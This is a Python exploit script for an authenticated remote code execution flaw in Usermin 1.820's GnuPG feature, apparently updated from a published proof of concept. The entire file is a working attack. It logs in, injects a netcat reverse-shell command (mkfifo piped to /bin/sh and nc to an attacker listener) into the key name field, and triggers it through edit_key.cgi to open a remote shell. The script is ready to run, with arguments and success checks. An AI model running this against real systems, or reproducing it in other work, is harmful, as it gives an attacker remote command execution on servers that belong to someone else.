# Title: Usermin 1.820 - Remote Code Execution (RCE) (Authenticated)
# Date: 27.08.2021 (Original)
# Author: Numan Türle (Original)
# Updated by x7331 (05/25)
# Vendor Homepage: https://www.webmin.com/usermin.html
# Software Link: https://github.com/webmin/usermin
# Version: <=1820
# Description:
#   This script exploits an authenticated RCE in Usermin 1.820 by abusing the GnuPG feature.
#   Updates by x7331 include:
#     - Added CLI args for listener IP/port (-lh, -lp)
#     - Improved login and payload submission checks
#     - Better exception handling to suppress traceback on reverse shell trigger
#     - User-friendly output messages
#     - Code cleanup and argument parsing improvements
#
# Usage:
#   python3 usermin-rce.py -u <host> -l <login> -p <password> -lh <listener_ip> -lp <listener_port>
#
# Reference video: https://youtu.be/wiRIWFAhz24
#

import argparse
import requests
import warnings
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import requests.exceptions

warnings.simplefilter('ignore', InsecureRequestWarning)

def init():
    parser = argparse.ArgumentParser(
        description='Usermin - Remote Code Execution (Authenticated) (Version 1.820)')
    parser.add_argument('-u', '--host', help='Target host IP or domain', type=str, required=True)
    parser.add_argument('-l', '--login', help='Username', type=str, required=True)
    parser.add_argument('-p', '--password', help='Password', type=str, required=True)
    parser.add_argument('-lh', '--listen_host', help='Listener IP for reverse shell', type=str, default='192.168.45.154')
    parser.add_argument('-lp', '--listen_port', help='Listener port for reverse shell', type=int, default=443)
    args = parser.parse_args()
    exploit(args)

def exploit(args):
    listen_ip = args.listen_host
    listen_port = args.listen_port

    session = requests.Session()
    target = f"https://{args.host}:20000"
    username = args.login
    password = args.password

    print(f"[+] Target: {target}")
    print(f"[+] Logging in as {username}")

    headers = {
        'Cookie': 'redirect=1; testing=1;',
        'Referer': target
    }

    login = session.post(target + "/session_login.cgi", headers=headers, verify=False, data={"user": username, "pass": password})
    login_content = login.text

    if "webmin_search.cgi" in login_content:
        print("[+] Login successful")
        print("[+] Setting up GnuPG with payload")

        payload = f"rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {listen_ip} {listen_port} > /tmp/f;"
        post_data = {
            "name": f'";{payload}echo "',
            "email": "1337@webmin.com",
        }

        print(f"[+] Payload: reverse shell to {listen_ip}:{listen_port}")

        session.headers.update({'Referer': target})

        create_secret = session.post(target + "/gnupg/secret.cgi", verify=False, data=post_data)
        create_secret_content = create_secret.text

        if "successfully" in create_secret_content:
            print("[+] Payload submitted")
            print("[+] Fetching key list...")

            key_list = session.post(target + "/gnupg/list_keys.cgi", verify=False)
            keys = re.findall(r"edit_key\.cgi\?(.*?)'", key_list.text)
            if not keys:
                print("[-] Failed to find key ID")
                return

            last_gets_key = keys[-1]
            print(f"[+] Key: {last_gets_key}")

            try:
                session.post(target + f"/gnupg/edit_key.cgi?{last_gets_key}", verify=False, timeout=3)
            except requests.exceptions.ReadTimeout:
                print("[+] Reverse shell should be coming in now! Timeout expected.")
            except requests.exceptions.ConnectionError:
                print("[+] Connection closed, likely due to reverse shell. This is expected.")
            else:
                print("[+] Payload triggered successfully.")

        else:
            print("[-] Failed to submit payload")
    else:
        print("[-] AUTH: Login failed.")

if __name__ == "__main__":
    init()
